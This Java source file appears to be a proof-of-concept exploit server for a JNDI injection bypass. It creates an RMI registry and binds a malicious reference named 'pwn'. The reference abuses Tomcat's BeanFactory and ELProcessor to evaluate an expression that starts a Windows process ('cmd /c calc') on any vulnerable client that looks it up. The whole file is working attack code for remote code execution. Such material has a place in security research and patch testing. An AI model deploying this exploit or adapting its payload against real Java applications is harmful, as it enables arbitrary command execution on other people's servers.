package JNDI.bypass2;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        StringRefAddr sr1 = new StringRefAddr("forceString", "X=eval");
        String el = "''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd','/c','calc']).start()\")";
        StringRefAddr sr2 = new StringRefAddr("X", el);
        ref.add(sr1);
        ref.add(sr2);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("pwn", referenceWrapper);
    }
}
